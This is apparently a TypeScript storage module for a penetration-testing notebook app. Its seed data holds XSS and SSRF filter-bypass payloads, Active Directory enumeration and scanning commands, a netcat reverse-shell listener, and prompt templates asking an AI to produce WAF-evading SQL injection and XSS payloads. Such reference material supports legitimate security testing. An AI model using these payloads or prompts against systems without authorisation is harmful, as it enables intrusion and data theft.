import { v4 as uuidv4 } from 'uuid';
import { Prompt, Note, Snippet, Resource } from '../types';

const STORAGE_KEYS = {
  PROMPTS: 'pentest_prompts',
  NOTES: 'pentest_notes',
  SNIPPETS: 'pentest_snippets',
  RESOURCES: 'pentest_resources'
};

// Generic storage helper
function getCollection<T>(key: string): T[] {
  const data = localStorage.getItem(key);
  return data ? JSON.parse(data) : [];
}

function saveCollection<T>(key: string, data: T[]): void {
  localStorage.setItem(key, JSON.stringify(data));
}

export const storage = {
  prompts: {
    getAll: () => getCollection<Prompt>(STORAGE_KEYS.PROMPTS),
    add: (item: Omit<Prompt, 'id' | 'updatedAt'>) => {
      const collection = getCollection<Prompt>(STORAGE_KEYS.PROMPTS);
      const newItem = { ...item, id: uuidv4(), updatedAt: new Date().toISOString() };
      saveCollection(STORAGE_KEYS.PROMPTS, [...collection, newItem]);
      return newItem;
    },
    update: (id: string, updates: Partial<Prompt>) => {
      const collection = getCollection<Prompt>(STORAGE_KEYS.PROMPTS);
      const updated = collection.map(p => p.id === id ? { ...p, ...updates, updatedAt: new Date().toISOString() } : p);
      saveCollection(STORAGE_KEYS.PROMPTS, updated);
    },
    delete: (id: string) => {
      const collection = getCollection<Prompt>(STORAGE_KEYS.PROMPTS);
      saveCollection(STORAGE_KEYS.PROMPTS, collection.filter(p => p.id !== id));
    }
  },
  notes: {
    getAll: () => getCollection<Note>(STORAGE_KEYS.NOTES),
    add: (item: Omit<Note, 'id' | 'updatedAt'>) => {
      const collection = getCollection<Note>(STORAGE_KEYS.NOTES);
      const newItem = { ...item, id: uuidv4(), updatedAt: new Date().toISOString() };
      saveCollection(STORAGE_KEYS.NOTES, [...collection, newItem]);
      return newItem;
    },
    update: (id: string, updates: Partial<Note>) => {
      const collection = getCollection<Note>(STORAGE_KEYS.NOTES);
      const updated = collection.map(n => n.id === id ? { ...n, ...updates, updatedAt: new Date().toISOString() } : n);
      saveCollection(STORAGE_KEYS.NOTES, updated);
    },
    delete: (id: string) => {
      const collection = getCollection<Note>(STORAGE_KEYS.NOTES);
      saveCollection(STORAGE_KEYS.NOTES, collection.filter(n => n.id !== id));
    }
  },
  snippets: {
    getAll: () => getCollection<Snippet>(STORAGE_KEYS.SNIPPETS),
    add: (item: Omit<Snippet, 'id'>) => {
      const collection = getCollection<Snippet>(STORAGE_KEYS.SNIPPETS);
      const newItem = { ...item, id: uuidv4() };
      saveCollection(STORAGE_KEYS.SNIPPETS, [...collection, newItem]);
      return newItem;
    },
    update: (id: string, updates: Partial<Snippet>) => {
      const collection = getCollection<Snippet>(STORAGE_KEYS.SNIPPETS);
      const updated = collection.map(s => s.id === id ? { ...s, ...updates } : s);
      saveCollection(STORAGE_KEYS.SNIPPETS, updated);
    },
    delete: (id: string) => {
      const collection = getCollection<Snippet>(STORAGE_KEYS.SNIPPETS);
      saveCollection(STORAGE_KEYS.SNIPPETS, collection.filter(s => s.id !== id));
    }
  },
  resources: {
    getAll: () => getCollection<Resource>(STORAGE_KEYS.RESOURCES),
    add: (item: Omit<Resource, 'id'>) => {
      const collection = getCollection<Resource>(STORAGE_KEYS.RESOURCES);
      const newItem = { ...item, id: uuidv4() };
      saveCollection(STORAGE_KEYS.RESOURCES, [...collection, newItem]);
      return newItem;
    },
    update: (id: string, updates: Partial<Resource>) => {
      const collection = getCollection<Resource>(STORAGE_KEYS.RESOURCES);
      const updated = collection.map(r => r.id === id ? { ...r, ...updates } : r);
      saveCollection(STORAGE_KEYS.RESOURCES, updated);
    },
    delete: (id: string) => {
      const collection = getCollection<Resource>(STORAGE_KEYS.RESOURCES);
      saveCollection(STORAGE_KEYS.RESOURCES, collection.filter(r => r.id !== id));
    }
  },
  seed: () => {
    // Seed Prompts
    if (!localStorage.getItem(STORAGE_KEYS.PROMPTS)) {
      const prompts = [
        {
          title: 'Subdomain Enumeration Strategy',
          category: 'recon',
          content: `Act as a senior penetration tester specializing in reconnaissance.

I'm targeting [TARGET_DOMAIN]. Generate a comprehensive subdomain enumeration strategy including:

1. Passive techniques (certificate transparency, DNS records, web archives)
2. Active techniques (brute-forcing with recommended wordlists)
3. Tools and one-liners for each technique
4. How to validate and prioritize discovered subdomains

Focus on techniques that won't trigger WAF alerts.`,
          tags: ['recon', 'subdomains', 'passive']
        },
        {
          title: 'SQL Injection Payload Generator',
          category: 'exploit',
          content: `You are an expert in SQL injection attacks. 

Given the following context:
- Database: [MySQL/PostgreSQL/MSSQL/Oracle]
- Injection point: [parameter name]
- Current payload that works: [payload]

Generate:
1. 5 variations to bypass WAF
2. Time-based blind payloads
3. Union-based payloads for data extraction
4. Stacked queries if applicable

Format as a table with payload, technique, and purpose.`,
          tags: ['sqli', 'bypass', 'payloads']
        },
        {
          title: 'Privilege Escalation Checklist',
          category: 'privesc',
          content: `Act as a red team operator. I have a low-privilege shell on a [Linux/Windows] system.

Enumerate and suggest privilege escalation vectors. Check for:

Linux:
- SUID/SGID binaries
- Sudo misconfigurations
- Cron jobs
- Kernel exploits
- Docker/container escapes

Windows:
- Unquoted service paths
- AlwaysInstallElevated
- Token impersonation
- Weak service permissions

Provide exact commands to check each vector.`,
          tags: ['privesc', 'linux', 'windows', 'enumeration']
        },
        {
          title: 'XSS Filter Bypass',
          category: 'exploit',
          content: `You are a web security expert specializing in XSS.

The target has the following filters:
- [describe filters, e.g., "blocks <script>, onclick, etc."]

Current context: [HTML/JS/attribute context]

Generate 10 bypass payloads ranked by likelihood of success. Include:
1. Encoding variations
2. Alternative event handlers
3. DOM-based techniques
4. Mutation XSS if applicable`,
          tags: ['xss', 'bypass', 'payloads']
        },
        {
          title: 'Report Executive Summary',
          category: 'reporting',
          content: `Write an executive summary for a penetration test report.

Context:
- Client: [CLIENT_NAME]
- Scope: [SCOPE]
- Duration: [DATES]
- Critical findings: [NUMBER]
- High findings: [NUMBER]

The summary should:
1. Be 1 paragraph (4-5 sentences)
2. Highlight business impact
3. Avoid technical jargon
4. End with a risk-rated recommendation

Tone: Professional but urgent.`,
          tags: ['reporting', 'executive', 'summary']
        }
      ];
      prompts.forEach(p => storage.prompts.add(p));
    }

    // Seed Notes
    if (!localStorage.getItem(STORAGE_KEYS.NOTES)) {
      const notes = [
        {
          title: 'XSS Payload Collection',
          category: 'Web/XSS',
          content: `# XSS Payload Collection

## Basic Payloads

\`\`\`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
\`\`\`

## Filter Bypass

### Case Variation
\`\`\`html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
\`\`\`

### Encoding
\`\`\`html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
\`\`\`

### Event Handlers (less common)
\`\`\`html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
\`\`\`

## DOM-based XSS
\`\`\`javascript
// Check for: location.hash, document.referrer, postMessage
// Sinks: innerHTML, document.write, eval
\`\`\``,
          tags: ['xss', 'payloads', 'bypass']
        },
        {
          title: 'SSRF Bypass Techniques',
          category: 'Web/SSRF',
          content: `# SSRF Bypass Techniques

## IP Address Variations

\`\`\`
127.0.0.1
127.0.1
127.1
0.0.0.0
0
localhost
LOCALHOST
[::1]
[0000::1]
[::ffff:127.0.0.1]
\`\`\`

## Decimal/Hex/Octal

\`\`\`
2130706433  (decimal for 127.0.0.1)
0x7f000001  (hex)
017700000001 (octal)
\`\`\`

## DNS Rebinding
Use a service like:
- rbndr.us
- nip.io
- xip.io
- sslip.io

## Protocol Smuggling

\`\`\`
gopher://
dict://
file://
sftp://
tftp://
\`\`\`

## Bypassing Filters

\`\`\`
http://127.0.0.1:80+&@google.com/
http://google.com#@127.0.0.1/
http://127.0.0.1\\@google.com/
\`\`\``,
          tags: ['ssrf', 'bypass', 'cloud']
        },
        {
          title: 'Active Directory Enumeration',
          category: 'Active Directory/Enumeration',
          content: `# Active Directory Enumeration

## Initial Recon (No Creds)

\`\`\`bash
# Enumerate DC
nmap -p 389,636,3268,3269 -sV <target>

# Null session
rpcclient -U "" -N <dc-ip>
enum4linux -a <dc-ip>

# LDAP anonymous
ldapsearch -x -H ldap://<dc-ip> -b "dc=domain,dc=com"
\`\`\`

## With Credentials

\`\`\`bash
# BloodHound collection
bloodhound-python -u <user> -p <pass> -d <domain> -c all

# PowerView
Get-DomainUser -Identity *admin*
Get-DomainGroup -AdminCount
Find-LocalAdminAccess
\`\`\`

## High Value Targets

1. Domain Admins
2. Enterprise Admins
3. Service accounts (Kerberoastable)
4. Computers with unconstrained delegation
5. Users with DCSync rights`,
          tags: ['ad', 'enumeration', 'bloodhound']
        }
      ];
      notes.forEach(n => storage.notes.add(n));
    }

    // Seed Snippets
    if (!localStorage.getItem(STORAGE_KEYS.SNIPPETS)) {
      const snippets = [
        {
          title: 'Quick Port Scan',
          command: 'nmap -sC -sV -oA scan TARGET',
          tool: 'nmap',
          description: 'Basic service detection with default scripts',
          tags: ['recon', 'ports']
        },
        {
          title: 'Full TCP Scan',
          command: 'nmap -p- -T4 --min-rate=1000 -oA full_tcp TARGET',
          tool: 'nmap',
          description: 'Scan all 65535 ports',
          tags: ['recon', 'thorough']
        },
        {
          title: 'Directory Bruteforce',
          command: 'ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200,301,302,403 -o output.json',
          tool: 'ffuf',
          description: 'Directory enumeration with common wordlist',
          tags: ['web', 'bruteforce']
        },
        {
          title: 'Subdomain Bruteforce',
          command: 'ffuf -u https://FUZZ.TARGET.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200',
          tool: 'ffuf',
          description: 'Virtual host discovery',
          tags: ['recon', 'subdomains']
        },
        {
          title: 'SQLMap Basic',
          command: 'sqlmap -u "https://target.com/page?id=1" --batch --risk=3 --level=5',
          tool: 'sqlmap',
          description: 'Automated SQL injection testing',
          tags: ['sqli', 'auto']
        },
        {
          title: 'Nuclei Full Scan',
          command: 'nuclei -u https://TARGET -t ~/nuclei-templates/ -severity critical,high -o results.txt',
          tool: 'nuclei',
          description: 'Vulnerability scanning with templates',
          tags: ['vuln', 'auto']
        },
        {
          title: 'Reverse Shell Listener',
          command: 'nc -lvnp 4444',
          tool: 'netcat',
          description: 'Basic netcat listener',
          tags: ['shell', 'listener']
        },
        {
          title: 'Python HTTP Server',
          command: 'python3 -m http.server 8080',
          tool: 'python',
          description: 'Quick file transfer server',
          tags: ['transfer', 'utility']
        }
      ];
      snippets.forEach(s => storage.snippets.add(s));
    }

    // Seed Resources
    if (!localStorage.getItem(STORAGE_KEYS.RESOURCES)) {
      const resources = [
        {
          title: 'PayloadsAllTheThings',
          url: 'https://github.com/swisskyrepo/PayloadsAllTheThings',
          category: 'payloads',
          note: 'Comprehensive payload collection for web attacks'
        },
        {
          title: 'HackTricks',
          url: 'https://book.hacktricks.xyz/',
          category: 'cheatsheets',
          note: 'Massive pentesting wiki'
        },
        {
          title: 'GTFOBins',
          url: 'https://gtfobins.github.io/',
          category: 'cheatsheets',
          note: 'Unix binaries for privilege escalation'
        },
        {
          title: 'LOLBAS',
          url: 'https://lolbas-project.github.io/',
          category: 'cheatsheets',
          note: 'Living Off The Land Binaries (Windows)'
        },
        {
          title: 'SecLists',
          url: 'https://github.com/danielmiessler/SecLists',
          category: 'wordlists',
          note: 'The wordlist collection'
        }
      ];
      resources.forEach(r => storage.resources.add(r));
    }
  },
  
  // Clear all data
  clearAll: () => {
    Object.values(STORAGE_KEYS).forEach(key => localStorage.removeItem(key));
    localStorage.removeItem('prompt_favorites');
  },
  
  // Export all data
  exportAll: () => {
    return {
      version: '1.0',
      exportedAt: new Date().toISOString(),
      prompts: storage.prompts.getAll(),
      notes: storage.notes.getAll(),
      snippets: storage.snippets.getAll(),
      resources: storage.resources.getAll(),
    };
  },
  
  // Import data
  importAll: (data: any) => {
    if (data.prompts) localStorage.setItem(STORAGE_KEYS.PROMPTS, JSON.stringify(data.prompts));
    if (data.notes) localStorage.setItem(STORAGE_KEYS.NOTES, JSON.stringify(data.notes));
    if (data.snippets) localStorage.setItem(STORAGE_KEYS.SNIPPETS, JSON.stringify(data.snippets));
    if (data.resources) localStorage.setItem(STORAGE_KEYS.RESOURCES, JSON.stringify(data.resources));
  }
};
